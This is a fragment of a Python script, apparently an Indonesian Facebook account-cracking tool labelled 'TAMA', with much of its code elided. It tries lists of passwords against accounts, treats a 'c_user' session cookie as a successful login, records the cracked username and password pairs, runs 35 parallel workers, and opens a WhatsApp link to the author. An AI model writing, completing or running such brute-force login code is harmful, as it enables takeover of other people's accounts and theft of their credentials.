...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[TAMA]","\x1b[1;92m[TAMA]","\x1b[1;92m[TAMA]","\x1b[1;92m[TAMA]","\x1b[1;92m[TAMA]","\x1b[1;92m[TAMA]","\x1b[1;92m[TAMA]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[TAMA-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            ...
            with TamaGanteng(max_workers=35) as kirim:
...
def alok():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/6282351476781?text=Hallo+BG+TAMA+izin+menggunakan+SC+ini');time.sleep(2);alok()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
